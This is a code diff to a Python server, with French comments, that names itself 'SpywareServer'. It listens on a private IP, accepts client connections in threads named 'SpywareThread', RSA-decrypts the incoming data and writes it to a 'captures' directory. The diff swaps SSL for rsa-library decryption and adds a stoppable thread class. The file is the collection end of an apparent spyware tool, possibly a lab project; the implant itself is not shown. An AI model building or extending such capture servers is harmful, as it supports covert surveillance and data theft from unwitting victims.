@@ -1,3 +1,4 @@
+from collections.abc import Callable, Iterable, Mapping
 import socket
 import datetime
 import argparse
@@ -5,12 +6,13 @@ import time
 import sys
 import os
 from pathlib import Path
-import ssl
 import signal
+from typing import Any
 import psutil
 import setproctitle
 from threading import Thread
 from functools import partial
+import rsa
 
 # Arguments 
 
@@ -28,6 +30,67 @@ args = parser.parse_args()
 cwd = Path.cwd()
 path_captures = cwd / "captures"
 
+
+# Classes
+
+class StoppableThread(Thread):
+    def __init__(self, conn, addr, key):
+        super(StoppableThread, self).__init__()
+        self.running = True
+        self.conn = conn
+        self.addr = addr
+        self.key = key
+    
+    def stop(self):
+        self.running = False
+    
+    def run(self):
+
+        return_code = ["OK"]
+
+
+        while self.running:
+            try:
+        
+                # Réception des données
+                data = rsa.decrypt(self.conn.recv(1024), key).decode()
+
+                if data == "":
+                    print("client dead ?")
+                    return_code[0] = "STOP"
+
+                # si des données ont été réceptionnées
+                if data:
+                    handle_data(data, self.addr)
+
+                    # renvoyer un code
+                    if return_code[0] == "OK":
+                        self.conn.send("OK".encode("utf-8"))
+
+
+            except Exception as e:
+                return_code[0] = "ERROR"
+                print(f"Error Main : {e}")
+
+            
+
+        data = rsa.decrypt(self.conn.recv(1024), key).decode()
+
+        # si des données ont été réceptionnées
+        if data:
+            handle_data(data, self.addr)
+
+            print("send stop code")
+            self.conn.send("STOP".encode("utf-8"))
+
+            # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
+            time.sleep(1)
+
+        self.conn.close()
+
+
+
+
 # Fonctions
 
 def handle_data(data, addr):
@@ -44,7 +107,7 @@ def handle_data(data, addr):
             file.write(data)
         os.rename(ficfilename,filename)
 
-    print(f"Data received and saved")
+    # print(f"Data received and saved")
 
 
 
@@ -101,63 +164,53 @@ def read_file(filename):
 
 
 
-def change_return_code(return_code, signal=None, frame=None):
-    return_code[0] = "STOP"
+# def handle_client(conn):
+
+#     return_code = ["OK"]
 
 
-
-def handle_client(ssl_socket):
-
-
-    running = True
-    return_code = ["OK"]
-
-    partial_stop_thread = partial(change_return_code, return_code)
-
-    signal.signal(signal.SIGTERM, partial_stop_thread)
-
-
-
-    while return_code[0] == "OK":
-        try:
+#     while return_code[0] == "OK":
+#         try:
     
-            # Réception des données
-            print("wait for data")
-            data = ssl_socket.recv(1024).decode('utf-8')
+#             # Réception des données
+#             print("wait for data")
+#             data = rsa.decrypt(conn.recv(1024), key).decode()
 
-            if data == "":
-                print("client dead ?")
-                return_code[0] = "STOP"
+#             print(f"Data received : {data}")
 
-            # si des données ont été réceptionnées
-            if data:
-                handle_data(data, addr)
+#             if data == "":
+#                 print("client dead ?")
+#                 return_code[0] = "STOP"
 
-                # renvoyer un code
-                if return_code[0] == "OK":
-                    print("[+] Keep running")
-                    ssl_socket.send("OK".encode("utf-8"))
+#             # si des données ont été réceptionnées
+#             if data:
+#                 handle_data(data, addr)
+
+#                 # renvoyer un code
+#                 if return_code[0] == "OK":
+#                     print("[+] Keep running")
+#                     conn.send("OK".encode("utf-8"))
 
 
-        except Exception as e:
-            return_code[0] = "STOP"
-            print(f"Error Main : {e}")
+#         except Exception as e:
+#             return_code[0] = "ERROR"
+#             print(f"Error Main : {e}")
 
         
 
-    data = ssl_socket.recv(1024).decode('utf-8')
+#     data = conn.recv(1024).decode('utf-8')
 
-    # si des données ont été réceptionnées
-    if data:
-        handle_data(data, addr)
+#     # si des données ont été réceptionnées
+#     if data:
+#         handle_data(data, addr)
 
-        print("send stop code")
-        ssl_socket.send("STOP".encode("utf-8"))
+#         print("send stop code")
+#         conn.send("STOP".encode("utf-8"))
 
-        # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
-        time.sleep(1)
+#         # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
+#         time.sleep(1)
 
-    ssl_socket.close()
+#     conn.close()
 
 
 
@@ -173,31 +226,13 @@ def get_server_instances():
     return procs
 
 
-def get_thread_instances():
-    procs = []
 
-    # itération sur tous les processus
-    for proc in psutil.process_iter():
-        if "SpywareThread" == proc.name():
-            procs.append(proc.pid)
+def stop_server(signal=None, frame=None, threads=None, socket_server=None):
 
-    return procs
-
-
-
-def stop_server(signal=None, frame=None):
-
-
-    threads = get_thread_instances()
-
-    for th in threads:
-        try:
-            os.kill(th, signal.SIGTERM)
-
-        except Exception as e:
-            print(f"Error while killing threads : {e}")
-
-
+    if threads != None:
+        for th in threads:
+            th.stop()
+    
     socket_server.close()
 
     print(f"stoping server. host : {host}")
@@ -211,9 +246,6 @@ def stop_server(signal=None, frame=None):
 if args.listen:
 
     setproctitle.setproctitle("SpywareServer")
-
-    signal.signal(signal.SIGTERM, stop_server)
-
     
     # Configuration du socket
     host = '172.16.120.1'
@@ -226,52 +258,59 @@ if args.listen:
 
     print(f"Server listening on {host}:{port}")
 
-    # while True:
-    try:
-        # récupération de la connexion
-        conn, addr = socket_server.accept()
 
-        # création du contexte ssl (avec le certificat et la clé privée)
-        context_connexion_ssl = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        context_connexion_ssl.load_cert_chain(certfile="./ssl2/certificate.pem", keyfile="./ssl2/private.pem")
-        # context_connexion_ssl.load_cert_chain(certfile="./ssl3/cert.pem", keyfile="./ssl3/private_key.pem")
+    with open("rsa/private.pem", mode='rb') as f:
+        key = rsa.PrivateKey.load_pkcs1(f.read())
+
+
+    threads = []
+
+    partial_stop_server = partial(stop_server, threads=threads, socket_server=socket_server)
+    signal.signal(signal.SIGTERM, partial_stop_server)
+
+
+    while True:
+        try:
+            # récupération de la connexion
+            # print("wait for connection")
+            conn, addr = socket_server.accept()
+
+            print("[+] Connexion acceptée")
+            print(conn)
+            print(addr)
+
+            th = StoppableThread(conn=conn, addr=addr, key=key)
+            th.name = "SpywareThread"
+            th.start()
+
+            threads.append(th)
         
-        # utilisation du SSL pour lire les données entrantes
-        ssl_socket = context_connexion_ssl.wrap_socket(conn, server_side=True)
 
-        handle_client(ssl_socket)
+        # interception du KeyboardInterrupt
+        except KeyboardInterrupt as e:
+            answered = False
+            
+            while not answered:
+                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")
 
-        # th = Thread(target=handle_client, args=(ssl_socket,))
-        # th.name = "SpywareThread"
-        # th.start()
-    
-    
+                if respons == 'y' or respons == 'n':
+                    answered = True
 
-    # interception du KeyboardInterrupt
-    except KeyboardInterrupt as e:
-        answered = False
-        
-        while not answered:
-            respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")
-
-            if respons == 'y' or respons == 'n':
-                answered = True
-
-        if respons == 'n' or respons == 'N':
-            # ne rien faire
-            print("[+] Le serveur ne sera pas arrêté")
+            if respons == 'n' or respons == 'N':
+                # ne rien faire
+                print("[+] Le serveur ne sera pas arrêté")
 
 
-        else:
-            # arrêter le serveur
-            print("[+] Le serveur va s'arrêter")
+            else:
+                # arrêter le serveur
+                print("[+] Le serveur va s'arrêter")
+                
+                stop_server(threads=threads, socket_server=socket_server)
 
-            stop_server()
 
-
-    except Exception as e:
-        running = False
-        print(f"Error Main : {e}")
+        except Exception as e:
+            running = False
+            print(f"Error Main : {e}")
 
 
 
